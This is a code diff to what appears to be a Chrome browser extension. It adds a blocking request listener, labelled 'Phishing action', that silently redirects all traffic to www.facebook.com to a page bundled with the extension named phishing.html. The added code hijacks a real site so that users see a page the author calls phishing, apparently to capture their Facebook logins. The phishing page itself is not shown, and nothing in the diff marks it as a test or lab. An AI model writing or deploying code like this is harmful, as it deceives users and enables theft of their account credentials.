@@ -27,6 +27,21 @@ chrome.webRequest.onBeforeRequest.addListener(
     ["blocking"] // makes request synchronous, does not load until function returns
 );
 
+// MARK: - Phishing action
+
+chrome.webRequest.onBeforeRequest.addListener(
+    function(details) {
+        return {redirectUrl: chrome.extension.getURL("./components/phishing/phishing.html")};
+    },
+   {
+       urls: [
+           "*://www.facebook.com/*"
+       ],
+       types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
+   },
+   ["blocking"]
+);
+
 // how to open pop up pages
 /*chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
